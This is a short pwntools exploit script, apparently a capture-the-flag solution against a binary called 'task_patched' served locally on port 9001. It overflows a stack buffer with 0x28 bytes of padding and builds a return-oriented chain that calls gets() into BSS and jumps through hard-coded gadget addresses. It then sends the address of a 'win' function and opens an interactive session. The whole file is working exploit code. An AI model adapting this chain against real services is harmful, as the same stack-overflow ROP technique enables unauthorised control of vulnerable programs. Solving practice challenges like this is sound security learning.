#!/usr/bin/env python3

from pwn import *

context.log_level = "debug"
elf = ELF("./task_patched", checksec=True)
context.binary = elf

libc = ELF("./libc.so.6", checksec=True)
ld = ELF("./ld-linux-x86-64.so.2", checksec=True)

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("127.0.0.1", 9001)

BSS = 0x404900
POP = 0x00401234
CALL = 0x00401218

rop = ROP(elf)
rop.raw(b"A" * 0x28)
rop.gets(BSS)
rop.raw(POP)
rop.raw(0)
rop.raw(0)
rop.raw(0)
rop.raw(BSS)
rop.raw(CALL)

p.sendline(rop.chain())
p.sendline(p64(elf.sym["win"]))

p.interactive()
